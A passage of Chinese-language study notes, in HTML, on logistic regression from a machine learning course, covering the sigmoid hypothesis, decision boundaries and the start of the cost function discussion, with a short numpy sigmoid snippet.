alt></p><ul><li>顺便说一下，<code>logistic回归</code>,我们将使用它作为分类算法，也许有时混淆了术语,它的名字上有”回归”，即使logistic回归实际上是一种分类算法。但是，这仅仅是它的名字被赋予历史的原因，所以不要被迷惑了。Logistic回归实际上是一种分类算法，当标签Y是离散值,零或一的时候。所以希望你现在知道是什么原因，使得你使用线性回归在分类问题上不是一个好主意。在接下来的视频中，我们将开始讨论logistic回归算法的细节。</li></ul><h3 id="小小的总结–分类问题"><a href="#小小的总结–分类问题" class="headerlink" title="小小的总结–分类问题"></a>小小的总结–分类问题</h3><p><strong>在分类问题中，你要预测的变量 $y$ 是<code>离散</code>的值</strong>，我们将学习一种叫做<code>逻辑回归 (Logistic Regression)</code> 的算法，这是目前最流行使用最广泛的一种学习算法。</p><p>在分类问题中，我们尝试预测的是结果是否属于某一个类（例如正确或错误）。分类问题的例子有：判断一封电子邮件是否是垃圾邮件；判断一次金融交易是否是欺诈；之前我们也谈到了肿瘤分类问题的例子，区别一个肿瘤是恶性的还是良性的。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104214053.png" alt></p><p>我们从二元的分类问题开始讨论。</p><p>我们将<code>因变量(dependent variable)</code>可能属于的两个类分别称为<code>负向类（negative class）</code>和<code>正向类（positive class）</code>，则因变量$y\in\{0,1\}$ ，其中 0 表示负向类，1 表示正向类。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104214110.png" alt></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104214119.png" alt></p><p>对于分类， $y$ 取值为 0 或者1，但如果你使用的是线性回归，那么假设函数的输出值可能远大于 1，或者远小于0，即使所有训练样本的标签  $y$ 都等于 0 或 1。尽管我们知道标签应该取值0 或者1，但是如果算法得到的值远大于1或者远小于0的话，就会感觉很奇怪。所以我们在接下来的要研究的算法就叫做<code>逻辑回归算法</code>，这个算法的性质是：<strong>它的输出值永远在0到 1 之间</strong>。</p><p>顺便说一下，逻辑回归算法是分类算法，我们将它作为分类算法使用。有时候可能因为这个算法的名字中出现了“回归”使你感到困惑，但逻辑回归算法实际上是一种分类算法，它适用于标签  $y$ 取值离散的情况，如：1 0 0 1。</p><h2 id="6-2-Hypothesis-Representation-假说表示"><a href="#6-2-Hypothesis-Representation-假说表示" class="headerlink" title="6.2 Hypothesis Representation(假说表示)"></a>6.2 Hypothesis Representation(假说表示)</h2><ul><li>让我们开始谈谈逻辑回归 在这段视频中 我要给你<strong>展示假设函数的表达式</strong> 也就是说 在分类问题中 要用什么样的函数来表示我们的假设</li><li>此前我们说过 希望我们的<strong>分类器的输出值在0和1之间</strong> 因此 我们 希望想出一个 满足某个性质的<strong>假设函数</strong> 这个性质是它的预测值要在0和1之间</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181203155212.png" alt></p><ul><li>当我们使用线性回归的时候 这是一种假设函数的形式 其中 $h(x)=\theta^Tx$</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181203155226.png" alt></p><ul><li>对于逻辑回归来说 我要把这个稍微改一下 把假设函数改成 $g(\theta^Tx)$  其中 我将定义 函数$g$如下： 当$z$是一个实数时 $g(z)=\frac{1}{1+e^{-z}}$这称为 <code>S 型函数 (sigmoid function)</code> 或<code>逻辑函数(Logistic function)</code></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181203155241.png" alt></p><ul><li>逻辑函数这个词 就是逻辑回归名字的由来 顺便说一下 <strong>S型函数和逻辑函数基本上是同义词</strong> 意思是一样的 因此 这两个术语 基本上是可互换的 哪一个术语都可以 用来表示这个函数 $g$</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181203155251.png" alt></p><ul><li>如果我们 把这两个方程 合并到一起 这是我的假设 的另一种写法 也就是说 $h(x)=\frac{1}{1+e^{-\theta^Tx}}$ <code>h(x)=1/(1+e^(-θ 转置乘以 x))</code>  我所做的是 把这个变量 $z$ 这里 $z$ 是一个实数 把 $\theta$ 的转置乘以 $x$ 代入到这里 所以最后得到的是 $\theta$ 转置乘以 $x$ 代替了这里的 $z$</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181203155300.png" alt></p><ul><li>最后 我们看一下S型函数是什么样的 我们在这儿绘制这个图形 S型函数 $g(z)$ 也称为逻辑函数 看起来是这样的 它开始接近0 然后上升 直到在原点处达到0.5 然后它再次变平 像这样 所以这就是<code>S型函数</code>的样子</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181203155327.png" alt></p><ul><li>而且你注意S型函数  它渐近于1 然后随着横坐标 的反方向趋向于0  <strong>随着 $z$ 趋于负无穷 $g(z)$ 趋近于零 随着 $z$ 趋于正无穷 $g(z)$ 趋近于1</strong> 因为 $g(z)$ 的取值  在0和1之间 我们就得到 $h(x)$ 的值 必在0和1之间</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181203155337.png" alt></p><ul><li>最后 有了这个假设函数 我们需要做的是 和之前一样 <strong>用参数$\theta$拟合我们的数据</strong> 所以拿到一个训练集 我们需要给参数 $\theta$ 选定一个值 然后用这个假设函数做出预测 稍后我们将讨论一个 用来拟合参数$\theta$的学习算法 但是首先让我们讨论 一下这个模型的解释</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181203155353.png" alt></p><ul><li>这就是我对 假设函数 $h(x)$ 的输出的解释:  <strong>当我的假设函数 输出某个数 我会认为这个数是 对于新输入样本 $x$ 的 <code>y 等于1</code>的概率的估计值</strong> 我的意思是这样的</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181203155406.png" alt></p><ul><li>下面举个例子 比方说 我们来看肿瘤分类的例子 我们有一个特征向量 $x$  和平时一样 $x_0$ 等于 1 然后我们的特征变量<code>x1</code> 是<code>肿瘤的大小</code></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181203155416.png" alt></p><ul><li>假设我有一个病人来了 而且知道<code>肿瘤的大小</code>  把他的特征向量 $x$ 代入我的假设函数 假如假设函数的输出为0.7 我将解释 我的假设如下 我要说 这个 假设告诉我 对于一个特征为 $x$ 的患者 $y$ 等于 1 的概率是0.7 换句话说 我要告诉我的病人 非常遗憾 肿瘤是恶性的可能性是70％或者说0.7</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181203155433.png" alt></p><ul><li>要更加正式的写出来 或者说写成数学表达式 我的假设函数等于  <code>P(y=1|x;θ)</code>  对于熟悉概率的人 应该能看懂这个式子 如果你不太熟悉概率 可以这么看这个表达式  在给定 $x$ 的条件下 $y=1$ 的概率 给定的 $x$ 就是我的病人的特征,  $x$ 特征代表了 我的病人特定的肿瘤大小  这个概率的参数是 $\theta$ 所以 我基本上可以认为 假设函数给出的估计 是 $y=1$ 的概率</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181203155447.png" alt></p><ul><li>现在 因为这是一个 分类的任务 我们知道 $y$ 必须是0或1 对不对？ 它们是 $y$ 可能取到的 仅有的两个值 无论是在训练集中 或是对走进我的办公室 或在未来进入医生办公室的新患者 因此 <strong>有了 $h(x)$ 我们也可以计算 $y=0$ 的概率</strong> 具体地说 因为 $y$ 必须是0或1 我们知道 $y=0$ 的概率 加上 $y=1$ 的概率 必须等于1 这第一个方程看起来 有点复杂 基本上就是说 给定参数 $\theta$ 对某个特征为 $x$ 的病人 $y=0$ 的概率 和给定参数 $\theta$ 时 对同一个特征为 $x$ 的病人 $y=1$ 的概率相加 必须等于1</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181203155502.png" alt></p><ul><li>如果觉得这个方程看到起来有点儿复杂 可以想象它没有 $x$ 和 $\theta$ 这就是说 <strong>$y=0$ 的概率 加上 $y=1$ 的概率必须等于1</strong> 我们知道这是肯定的 因为 $y$ 要么是0 要么是1 所以 $y=0$ 的可能性 和 $y=1$ 的可能性 它们俩相加肯定等于1</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181203155513.png" alt></p><ul><li>所以 如果你只是 把这一项 移到右边 你就会得到这个等式 就是说 $y=0$ 的概率 等于1减去 $y=1$ 的概率 因此 我们的 假设函数 $h(x)$ 给出的是这一项 你可以简单地计算出这个概率  计算出 $y=0$ 的概率的估计值  所以 你现在知道  逻辑回归的假设函数的表达式是什么 我们看到了定义逻辑回归的 假设函数的数学公式 在接下来的视频中 我想试着让你 对假设函数是什么样子 有一个更直观的认识 我想告诉你 一个被称为<code>判定边界 (decision)</code> 的东西  我们会一起看一些可视化的东西 可以更好地理解 逻辑回归的假设函数 到底是什么样子</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181203155529.png" alt></p><h3 id="小小的总结–假说表示"><a href="#小小的总结–假说表示" class="headerlink" title="小小的总结–假说表示"></a>小小的总结–假说表示</h3><p>在这段视频中，我要给你展示假设函数的表达式，也就是说，在分类问题中，要用什么样的函数来表示我们的假设。此前我们说过，希望我们的分类器的输出值在0和1之间，因此，我们希望想出一个满足某个性质的假设函数，这个性质是它的预测值要在0和1之间。</p><p>回顾在一开始提到的乳腺癌分类问题，我们可以用线性回归的方法求出适合数据的一条直线：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104214145.png" alt></p><p>根据线性回归模型我们只能预测连续的值，然而对于分类问题，我们需要输出0或1，我们可以预测：</p><p>当 ${h_\theta}\left(x\right)$ 大于等于0.5时，预测 $y=1$。</p><p>当 ${h_\theta}\left(x\right)$ 小于0.5时，预测 $y=0$ 。</p><p>对于上图所示的数据，这样的一个线性模型似乎能很好地完成分类任务。假使我们又观测到一个非常大尺寸的恶性肿瘤，将其作为实例加入到我们的训练集中来，这将使得我们获得一条新的直线。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104214231.png" alt></p><p>这时，再使用0.5作为阀值来预测肿瘤是良性还是恶性便不合适了。可以看出，线性回归模型，因为其预测的值可以超越[0,1]的范围，并不适合解决这样的问题。</p><p>我们引入一个新的模型，<code>逻辑回归</code>，<strong>该模型的输出变量范围始终在0和1之间</strong>。<br><code>逻辑回归模型的假设</code>是： $h_\theta \left( x \right)=g\left(\theta^{T}X \right)$<br>其中：</p>$X$ 代表特征向量$g$ 代表逻辑函数（logistic function)是一个常用的逻辑函数为`S形函数（Sigmoid function）`，公式为： $g\left( z \right)=\frac{1}{1+{{e}^{-z}}}$。<p>python代码实现：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">def</span> <span class="token function">sigmoid</span><span class="token punctuation">(</span>z<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">return</span> <span class="token number">1</span> <span class="token operator">/</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">+</span> np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span><span class="token operator">-</span>z<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>该函数的图像为：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104214245.png" alt></p><p>合起来，我们得到逻辑回归模型的假设：</p><p>对模型的理解： $g\left( z \right)=\frac{1}{1+{{e}^{-z}}}$。</p>$h_\theta \left( x \right)$的`作用`是，**对于给定的输入变量，根据选择的参数计算输出变量=1的可能性**（estimated probablity）即$h_\theta \left( x \right)=P\left( y=1|x;\theta \right)$<p>例如，如果对于给定的x，通过已经确定的参数计算得出$h_\theta \left( x \right)$=0.7，则表示有70%的几率y为正向类，相应地y为负向类的几率为1-0.7=0.3。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104214325.png" alt></p><h2 id="6-3-Decision-boundary-决策边界"><a href="#6-3-Decision-boundary-决策边界" class="headerlink" title="6.3 Decision boundary(决策边界)"></a>6.3 Decision boundary(决策边界)</h2><ul><li>在过去的视频中 我们谈到 逻辑回归中假设函数的表示方法 现在 我想 告诉大家一个叫做 <code>决策边界(decision boundary)</code>的概念 这个概念能更好地帮助我们 理解逻辑回归的 假设函数在计算什么</li><li>让我们回忆一下 这是我们上次写下的公式 当时我们说 假设函数可以表示为 $h(x)=g(\theta^Tx)$ 其中函数$g$被称为<code>S形函数（sigmoid function）</code> 看起来是应该是这样的形状 它从零开始慢慢增加至1 逐渐逼近1</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181231174001.png" alt></p><ul><li>现在让我们 更进一步来理解 这个假设函数何时 会将$y$预测为1 什么时候又会将 $y$预测为0 让我们更好的理解 假设函数的应该是怎样的 特别是当我们的数据有多个特征时</li><li>具体地说 这个假设函数 输出的是 <strong>给定$x$时 $y=1$的概率</strong></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181231174235.png" alt></p><ul><li>因此 如果我们想 预测$y=1$ 还是等于0 我们可以这样做 只要该假设函数 输出$y=1$的概率 大于或等于0.5 那么这表示 $y$更有可能 等于1而不是0 因此 我们预测$y=1$</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181231174328.png" alt></p><ul><li>在另一种情况下 如果 预测$y=1$ 的概率 小于0.5 那么我们应该预测$y=0$</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181231174425.png" alt></p><ul><li>在这里 我选择大于等于 在这里我选择小于 如果$h(x)$的值 正好等于0.5 那么 我们可以预测为1 也可以预测为0 但是这里我选择了大于等于 因此我们默认 如果$h(x)$等于0.5的话 预测选择为1 这只是一个细节 不用太在意</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181231174518.png" alt></p><ul><li>下面 我希望大家能够 清晰地理解 什么时候$h(x)$ 将大于或等于 0.5 从而 我们最终预测$y=1$ 如果我们看看 S形函数的曲线图 我们会注意到 <code>S函数</code> 只要$z$大于 或等于0时 $g(z)$就将大于 或等于0.5 因此 在曲线图的这半边 $g$的取值 大于或等于0.5  因为这个交点就是0.5 因此 当$z$大于0时 $g(z)$ 也就是这个 S形函数 是大于或等于0.5的</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181231174724.png" alt></p><ul><li>由于逻辑回归的 假设函数$h(x)$ 等于$g(\theta^Tx)$ 因此 只要$\theta^Tx$ 大于或等于0 函数值将会 大于或等于0.5</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181231174946.png" alt></p><ul><li>因此 我们看到 因为这里$\theta^Tx$ 取代了$z$的位置 所以我们看到 只要$\theta^Tx$ 大于或等于0 我们的假设函数 将会预测$y=1$</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181231175139.png" alt></p><ul><li>现在让我们来考虑 假设函数 预测$y=0$的情况 类似的 只要 $g(z)$小于0.5 $h(\theta)$将会 小于0.5  这是因为 $z$的定义域上 导致$g(z)$取值 小于0.5的部分 是$z$小于0的部分 所以当$g(z)$小于0.5时 我们的假设函数将会预测 $y=0$ 根据与之前 类似的原因 $h(x)=g(\theta^Tx)$ 因此 只要 $\theta^Tx$小于0 我们就预测$y$等于0</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181231175556.png" alt></p><ul><li>总结一下我们刚才所讲的 我们看到 如果我们要决定 预测$y=1$ 还是$y=0$ 取决于 $y=1$的概率 大于或等于0.5 还是小于0.5 这其实就等于说 只需要$\theta^Tx$ 大于或等于0 我们将预测$y=1$  另一方面只需要$\theta^Tx$ 小于0 我们将预测$y=0$  通过这些 我们能更好地 理解如何利用逻辑回归的假设函数 来进行预测</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181231175929.png" alt></p><ul><li>现在假设我们有 一个训练集 就像下图的这个 接下来我们假设我们的假设函数是 $h_\theta(x)=g(\theta_0+\theta_1x_1+\theta_2x_2)$ 目前我们还没有谈到 如何拟合此模型中的参数 我们将在下一个视频中讨论这个问题 但是假设我们 已经拟合好了参数 我们最终选择了如下值 比方说 我们选择$\theta_0$ 等于-3 $\theta_1$ 等于1 $\theta_2$等于1 因此 这意味着我的 参数向量将是 $\theta$等于[-3 1 1]</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181231180300.png" alt></p><ul><li>这样 我们有了 这样的一个参数选择 让我们试着找出 假设函数何时将 预测$y$等于1 何时又将预测$y$等于0 使用我们在 在上一张幻灯片上展示的公式 我们知道 只要$\theta^Tx$ 大于0 $y$更有可能是1 或者说 $y$等于1的概率 大于0.5 或者大于等于0.5  我刚刚加了下划线的 这个公式 $-3+x_1+x_2$ 当然就是$\theta^Tx$  这是当$\theta$等于 我们选择的这个参数值时 $\theta^Tx$的表达</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181231180547.png" alt></p><ul><li>因此 举例来说 对于任何样本 只要$x_1$和$x_2$满足 这个等式 也就是$-3+x_1+x_2\geq0$ 我们的假设函数就会认为 $y$等于1 的可能性较大 或者说将预测$y=1$</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181231180847.png" alt></p><ul><li>我们也可以 将$-3$放到不等式右边 并改写为 $x_1+x_2\geq3$ 这样是等价的 我们发现 只要 $x_1+x_2\geq3$ 这一假设函数将预测 $y=1$</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181231181038.png" alt></p><ul><li>让我们来看看这在图上是什么意思 如果我写下等式 $x_1+x_2=3$ 这将定义一条直线 如果我画出这条直线 它将表示为 这样一条线 它通过 通过$x_1$轴上的3 和$x_2$轴上的3 因此 这部分的输入样本空间 这一部分的 <code>X1-X2</code>平面 对应$x_1+x_2\geq3$ 这将是上面这个半平面 也就是所有 上方和所有右侧的部分 相对我画的这条洋红色线来说 所以 我们的假设函数预测 $y=1$的区域 就是这片区域 是这个巨大的区域 是右上方的这个半平面 让我把它写下来 我将称它为 $y=1$区域</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181231181355.png" alt></p><ul><li>与此相对 $x_1+x_2<3$的区域 也就是我们预测 $y$等于0的区域 是这一片区域 你看到 这也是一个半平面 左侧的这个半平面 是我们的假设函数预测y等于0的区域< li></3$的区域></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181231181544.png" alt></p><ul><li>我想给这条线一个名字 就是我刚刚画的这条洋红色线 这条线被称为 <code>决策边界（decision boundary）</code> 具体地说 这条直线 满足$x_1+x_2=3$ 它对应一系列的点 它对应 $h(x)$等于 0.5的区域 决策边界 也就是 这条直线 将整个平面分成了两部分 其中一片区域假设函数预测$y$等于1 而另一片区域 假设函数预测$y$等于0</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181231181721.png" alt></p><ul><li>我想澄清一下 <strong>决策边界是 假设函数的一个属性</strong> 它包括参数$\theta_0,\theta_1,\theta_2$ 在这幅图中 我画了一个训练集 我画了一组数据 让它更加可视化 但是 即使我们 去掉这个数据集 这条决策边界 和我们预测$y$等于1 与$y$等于0的区域 <strong>它们都是 假设函数的属性 决定于其参数 它不是数据集的属性</strong> 当然 我们后面还将讨论 如何拟合参数 那时 我们将 使用训练集 使用我们的数据 来确定参数的取值 但是 一旦我们有确定的参数取值 有确定的$\theta_0,\theta_1,\theta_2$ 我们就将完全确定 决策边界 这时 我们实际上并不需要 在绘制决策边界的时候 绘制训练集</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181231182017.png" alt></p><ul><li>现在 让我们看一个 更复杂的例子 和往常一样 我使用十字 (X) 表示我的<code>正样本</code> 圆圈 (O) 的表示我的<code>负样本</code> 给定这样的一个训练集 我怎样才能使用逻辑回归 拟合这些数据呢？</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181231182256.png" alt></p><ul><li>早些时候 当我们谈论 多项式回归 或线性回归时 我们谈到可以添加额外的 <code>高阶多项式项</code> 同样我们也可以对逻辑回归使用相同的方法 具体地说 假如我的假设函数是这样的 $h_\theta(x)=g(\theta_0+\theta_1x_1+\theta_2x_2+\theta_3x_1^2+\theta_4x_2^2)$ 我已经添加了两个额外的特征 $x_1^2$和$x_2^2$ 所以 我现在有5个参数 $\theta_0$ 到 $\theta_4$ 之前讲过 我们会 在下一个视频中讨论 如何自动选择 参数$\theta_0$ 到 $\theta_4$的取值 但是 假设我 已经使用了这个方法 我最终选择$\theta_0$等于-1 $\theta_1$等于0 $\theta_2$等于0 $\theta_3$等于1 $\theta_4$等于1 这意味着 在这个参数选择下 我的参数向量 $\theta$将是<code>[-1 0 0 1 1]</code></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181231182550.png" alt></p><ul><li>根据我们前面的讨论 这意味着 只要$-1+x_1^2+x_2^2\geq0$  我的假设函数将预测 <code>y=1</code>  也就是$\theta^Tx$大于等于0的时候 如果我将 -1放到不等式右侧 我可以说 只要$x_1^2+x_2^2\geq1$ 我的假设函数将预测 $y=1$</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181231182956.png" alt></p><ul><li>那么决策边界是什么样子的呢？ 好吧 如果我们绘制 $x_1^2+x_2^2=1$的曲线 你们有些人已经 知道这个方程对应 半径为1 原点为中心的圆 所以 这就是我们的决策边界</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181231183106.png" alt></p><ul><li>圆外面的一切 我将预测 $y=1$ 所以这里就是 y等于1的区域 我们在这里预测$y=1$ 而在圆里面 我会预测$y=0$</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181231183244.png" alt></p><ul><li>因此 通过增加这些 复杂的多项式特征变量 我可以得到更复杂的决定边界 而不只是 用直线分开正负样本 在这个例子中 我可以得到 一个圆形的决策边界 再次强调 <strong>决策边界 不是训练集的属性 而是假设本身及其参数的属性</strong> 只要我们 给定了参数向量$\theta$ 圆形的决定边界 就确定了 我们不是用训练集来定义的决策边界 <strong>我们用训练集来拟合参数$\theta$</strong> 以后我们将谈论如何做到这一点 但是 一旦你有 参数$\theta$它就确定了决策边界</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181231183403.png" alt></p><ul><li>让我重新显示训练集 以方便可视化 最后 让我们来看看一个更复杂的例子 我们可以得到 更复杂的决策边界吗？ 如果我有 高阶多项式特征变量 比如$x_1^2$, $x_1^2x_2$ $x_1^2x_2^2$ 等等 如果我有更高阶 多项式 那么可以证明 你将得到 更复杂的决策边界 而逻辑回归 可以用于找到决策边界 例如 这样一个椭圆 或者参数不同的椭圆</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181231183658.png" alt></p><ul><li>也许你 可以得到一个不同的决定边界 像这个样子 一些有趣的形状 或者更为复杂的例子 你也可以得到决策边界 看起来这样 这样更复杂的形状 在这个区域 你预测$y=1$ 在这个区域外面你预测$y=0$ 因此 这些高阶多项式 特征变量 可以让你得到非常复杂的决策边界 因此 通过这些可视化图形 我希望告诉你 什么范围的假设函数 我们可以使用 逻辑回归来表示 现在我们知道了$h(x)$表示什么 在下一个视频中 我将介绍 如何自动选择参数$\theta$ 使我们能在给定一个训练集时 我们可以根据数据自动拟合参数</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181231183801.png" alt></p><h3 id="小小的总结–决策边界"><a href="#小小的总结–决策边界" class="headerlink" title="小小的总结–决策边界"></a>小小的总结–决策边界</h3><p>现在讲下<code>决策边界(decision boundary)</code>的概念。这个概念能更好地帮助我们理解逻辑回归的假设函数在计算什么。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104214348.png" alt></p><p>在逻辑回归中，我们预测：</p><p>当$h_\theta \left( x \right)$大于等于0.5时，预测 $y=1$。</p><p>当$h_\theta \left( x \right)$小于0.5时，预测 $y=0$ 。</p><p>根据上面绘制出的 S 形函数图像，我们知道当</p>$z=0$ 时 $g(z)=0.5$$z>0$ 时 $g(z)>0.5$$z<0$ 时 $g(z)<0.5$ <p>又 $z={\theta^{T}}x$ ，即：<p></p>${\theta^{T}}x$ 大于等于 0 时，预测 $y=1$${\theta^{T}}x$ 小于 0 时，预测 $y=0$<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104214404.png" alt></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104214412.png" alt></p><p>现在假设我们有一个模型：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104214425.png" alt></p><p>并且参数$\theta$ 是向量[-3; 1; 1]。 则当$-3+{x_1}+{x_2} \geq 0$，即${x_1}+{x_2} \geq 3$时，模型将预测 $y=1$。<br>我们可以绘制直线${x_1}+{x_2} = 3$，这条线便是我们模型的<code>分界线</code>，将预测为1的区域和预测为 0的区域分隔开。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104214433.png" alt></p><p>假使我们的数据呈现这样的分布情况，怎样的模型才能适合呢？</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104214443.png" alt></p><p>因为需要用曲线才能分隔 y=0 的区域和 y=1 的区域，我们需要二次方特征：${h_\theta}\left( x \right)=g\left( {\theta_0}+{\theta_1}{x_1}+{\theta_{2}}{x_{2}}+{\theta_{3}}x_{1}^{2}+{\theta_{4}}x_{2}^{2} \right)$是[-1 0 0 1 1]，则我们得到的判定边界恰好是圆点在原点且半径为1的圆形。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104214455.png" alt></p><p>我们可以用非常复杂的模型来适应非常复杂形状的判定边界。</p><h2 id="6-4-Cost-Function-代价函数"><a href="#6-4-Cost-Function-代价函数" class="headerlink" title="6.4 Cost Function(代价函数)"></a>6.4 Cost Function(代价函数)</h2><ul><li>在这段视频中 我们要讲如何拟合逻辑回归模型的参数$\theta$具体来说 我<strong>要定义用来拟合参数的优化目标或者叫<code>代价函数</code></strong></li><li>这便是监督学习问题中的逻辑回归模型的拟合问题 我们有一个训练集 里面有$m$个训练样本 像以前一样 我们的每个样本 用$n+1$维的特征向量表示 同样和以前一样 第一个特征变量或者说第0个特征变量 一直是1 而且因为这是一个分类问题 我们的训练集 具有这样的特征 <strong>所有的y 不是0就是1</strong></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190101212926.png" alt></p><ul><li>这是一个<code>假设函数</code> 它的参数是这里的这个$\theta$ 我要说的问题是 <strong>对于这个给定的训练集 我们如何选择 或者说如何拟合参数$\theta$</strong></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190101213109.png" alt></p><ul><li>以前我们推导线性回归时 使用了这个代价函数 $J(\theta)=\frac{1}{m}\sum\limits_{i=1}^m\frac{1}{2}\left(h_\theta(x^{(i)})-y^{(i)}\right)^2$ 我把这个写成稍微有点儿不同的形式 不写原先的$\frac{1}{2m}$ 我把$\frac{1}{2}$ 放到求和符号里面了</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190101213235.png" alt></p><ul><li>现在我想用另一种方法来写代价函数 去掉这个平方项 把这里写成 这样的形式 $Cost(h_\theta(x^{(i)},y^{(i)})$  定义这个<code>Cost函数</code>为$Cost(h_\theta(x^{(i)},y^{(i)})=\frac{1}{2}\left(h_\theta(x^{(i)})-y^{(i)}\right)^2$</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190101214105.png" alt></p><ul><li>我们能更清楚的看到 代价函数是这个<code>Cost函数</code> 在训练集范围上的求和 或者说是$\frac{1}{m}$倍的 这个代价项在训练集范围上的求和 然后稍微简化一下这个式子 去掉这些上标 会显得方便一些所以直接定义 代价值$(h(x),y)$ 等于$\frac{1}{2}$倍的 这个平方根误差</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190101214331.png" alt></p><ul><li>对这个代价项的理解是这样的 这是我所期望的 我的学习算法 如果想要达到这个值 也就是这个假设$h(x)$ 所需要付出的代价 这个希望的预测值是$h(x)$ 而实际值则是$y$ 显然 在<code>线性回归中</code> 代价值会被定义为 1/2乘以 预测值$h$和 实际值观测的结果$y$ 的差的平方 这个代价值可以 很好地用在线性回归里</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190101214618.png" alt></p><ul><li>但是我们现在要用在逻辑回归里 如果我们可以最小化 代价函数$J$里面的这个代价值 它会工作得很好 但实际上 如果我们使用这个代价值 它会变成参数$\theta$的<code>非凸函数</code></li><li>我说的非凸函数是这个意思 对于这样一个代价函数$J(\theta)$ 对于<code>逻辑回归</code>来说 这里的$h$函数 是非线性的 对吧？ 它是等于 $\frac{1}{1+e^{-\theta^Tx}}$ 所以它是一个很复杂的非线性函数 如果对它取<code>Sigmoid函数</code> 然后把它放到$Cost(h_\theta(x^{(i)},y^{(i)})$   然后求它的代价值 再把它放到$J(\theta)$上 然后再画出 $J(\theta)$长什么模样 你会发现 $J(\theta)$可能是一个这样的函数 有很多局部最优值 称呼它的正式术语是 这是一个<code>非凸函数(non-convex)</code></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190101215241.png" alt></p><ul><li>你大概可以发现 如果你把梯度下降法 用在一个这样的函数上 不能保证它会 收敛到全局最小值 相应地 我们希望 我们的代价函数$J(\theta)$ 是一个<code>凸函数(convex)</code> 是一个单弓形函数 大概是这样 所以如果对它使用梯度下降法 我们可以保证梯度下降法 <strong>会收敛到该函数的全局最小值</strong></li></ul><p><img 